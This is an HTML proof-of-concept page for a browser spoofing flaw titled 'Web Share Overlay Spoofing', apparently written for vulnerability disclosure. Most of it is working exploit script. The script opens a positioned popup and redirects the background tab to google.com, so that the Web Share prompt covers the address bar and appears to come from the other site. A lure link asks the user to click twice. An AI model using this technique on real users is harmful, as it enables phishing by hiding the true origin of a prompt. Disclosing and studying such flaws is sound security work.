<!doctype html>
<html>
<head>
<style>
html { font-family: sans-serif; }
#linkElem {
  position: absolute;
  top: 320px;
  left: calc(50vw - 115px);
  width: 230px;
  text-align: center;
  font-size: 1.5em;
}
</style>
</head>
<body>
<h1>Web Share Overlay Spoofing</h1>
<p>Opens a popup that requires a second user click to trigger, after which the Web Share interface appears over the browser’s address bar and UI, making it look as if the share prompt originates from the background tab since the popup’s origin and window controls are hidden.</p>
<a id="linkElem" href="#">Click twice to go to Google.com</a>
<script>
linkElem.addEventListener('click', (e) => {
  e.preventDefault();
  var topPos = 200 + window.screenTop;
  var popupWidth = 340;
  var leftPos = (window.innerWidth / 2) - (popupWidth / 2) + window.screenLeft;
  window.open(
    'poc.html',
    'test',
    'width='+popupWidth+',height=240,top='+topPos+',left='+leftPos
  );

  setTimeout(() => {
    window.location = 'https://google.com';
  }, 100);
});
</script>
</body>
</html>
